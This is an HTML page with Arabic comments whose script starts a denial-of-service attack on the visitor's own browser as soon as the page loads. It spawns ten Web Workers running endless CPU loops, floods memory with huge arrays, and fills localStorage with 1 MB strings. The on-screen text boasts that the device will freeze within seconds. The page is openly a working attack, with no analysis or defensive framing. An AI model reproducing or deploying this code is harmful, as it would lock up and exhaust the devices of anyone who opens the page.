<!DOCTYPE html>
<html>
<head>
    <title>💀 النظام تحت السيطرة</title>
</head>
<body>
    <h1>🔥 جاري تعطيل النظام...</h1>
    <p>الجهاز هيعلق خلال ثواني 😈</p>

    <script>
        // =============================================
        // 🧠 الطريقة الأولى: استهلاك المعالج (CPU)
        // =============================================
        function cpuKiller() {
            while (true) {
                // عملية حسابية ثقيلة بلا توقف
                Math.sqrt(Math.random() * 1000000);
            }
        }

        // =============================================
        // 🧠 الطريقة الثانية: استهلاك الذاكرة (RAM)
        // =============================================
        function ramKiller() {
            let arr = [];
            while (true) {
                // ملء مصفوفة ببيانات ضخمة
                arr.push(new Array(1000000).fill("💀🔥"));
            }
        }

        // =============================================
        // 🧠 الطريقة الثالثة: استهلاك التخزين المحلي
        // =============================================
        function storageKiller() {
            let i = 0;
            while (true) {
                try {
                    localStorage.setItem('x' + i, 'x'.repeat(1024 * 1024)); // 1 ميجا في كل مرة
                    i++;
                } catch (e) {
                    // لو التخزين امتلأ، نعيد المحاولة
                }
            }
        }

        // =============================================
        // 🚀 تشغيل كل الطرق مع بعض
        // =============================================
        function startAttack() {
            // استخدام Web Workers عشان نشتغل في الخلفية
            for (let i = 0; i < 10; i++) {
                let worker = new Worker(URL.createObjectURL(new Blob([
                    `self.onmessage = function(e) {
                        while(true) {
                            Math.sqrt(Math.random() * 1000000);
                        }
                    }`
                ])));
                worker.postMessage('start');
            }

            // تشغيل مهاجم الذاكرة
            ramKiller();

            // تشغيل مهاجم التخزين
            storageKiller();

            // تشغيل مهاجم المعالج (CPU)
            cpuKiller();
        }

        // 🔥 نبدأ الهجوم فوراً
        startAttack();
    </script>
</body>
</html>
